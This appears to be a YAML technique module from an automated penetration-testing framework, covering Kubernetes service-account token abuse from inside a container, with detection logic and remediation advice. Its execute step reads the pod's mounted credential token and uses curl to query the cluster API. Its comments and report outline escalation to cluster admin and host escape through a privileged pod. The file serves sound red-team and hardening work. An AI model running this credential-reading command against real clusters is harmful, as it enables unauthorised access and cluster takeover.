# Container escape → K8s service-account token → cluster API
#
# When a Kubernetes pod is deployed without explicitly disabling the
# default service-account mount, /var/run/secrets/kubernetes.io/serviceaccount
# contains a token, ca.crt, and namespace file. The operator uses that token
# to talk to the API server (via curl or kubectl). Depending on the SA's
# RBAC, this ranges from "read pod names" (annoying) to "create privileged
# pods" (full cluster admin via a manufactured privileged pod → host node).
#
# Fires only inside a container (has_k8s_token can't exist elsewhere).
technique: T1611
name: Container escape → K8s service-account → cluster API
tactic: [privilege-escalation, discovery]
platform: [linux]
key: container_escape:k8s_sa
ranking:
  exploitability: medium       # depends on SA RBAC; often over-permissive
  safety: read-only            # initial query is read-only; escalation may write
  detection: moderate          # API-server audit logs the request
detect:
  facts_match:
    has_k8s_token: true
execute:
  # Probe the API server for what the token can see — namespaces list is
  # the standard "who am I" query. A 200 confirms the token works and gives
  # the operator the starting set of namespaces to enumerate further.
  command: |-
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && \
      curl -sk -H "Authorization: Bearer $TOKEN" \
        --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
        "https://kubernetes.default.svc/api/v1/namespaces" | head -c 300
verify:
  success: "NamespaceList"
cleanup:
  command: ""
report:
  vector_type: container_escape_k8s_sa
  description: >
    A Kubernetes pod with a mounted service-account token can authenticate
    to the API server (kubernetes.default.svc). The SA's RBAC binding
    determines the blast radius: over-permissive bindings (cluster-admin,
    edit on namespaces the operator shouldn't touch) turn a pod
    compromise into cluster compromise. Full escape path: use the token
    to create a privileged pod bound to a host node, then break out of
    THAT pod to the host.
  remediation: >
    Set `automountServiceAccountToken: false` on pods that don't need it.
    For pods that do, bind the SA to a narrow Role (never a ClusterRole
    unless the workload documents the cluster-wide need). Enable audit
    logging and alert on 401→200 transitions from pod IPs.
  refs: [T1611, T1552.005, CIS-K8s-5.1.5, CIS-K8s-5.1.6]
